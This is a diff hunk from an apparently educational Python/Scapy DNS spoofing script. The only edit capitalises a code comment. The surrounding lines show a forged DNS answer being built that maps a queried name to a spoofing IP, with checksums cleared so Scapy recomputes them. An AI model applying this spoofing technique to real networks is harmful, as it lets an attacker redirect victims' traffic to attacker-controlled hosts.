@@ -211,7 +211,7 @@ def modify_packet(packet):
     # So the qname is again set to url_webpage and the rdata (corresponding IP address) is set to the matching IP address from the dictionary ""dns_hosts".
     # Now, the url_webpage will be mapped to the corresponding spoofing IP address "ip_dns_spoof" from the dictionary "dns_hosts".
     packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname]) # rrname: record name, rdata: record data
-    # set the answer count to 1, indicating that the number of items in the answer section is equal to 1.
+    # Set the answer count to 1, indicating that the number of items in the answer section is equal to 1.
     packet[DNS].ancount = 1
     # We delete the checksums and the length of the packet. This is needed because the checksum and the length of the packet have changed due to modification of the packet.
     # Of course calculations are required in order to obtain the new checksums and the length of the modified packet. This is automatically done by scapy.
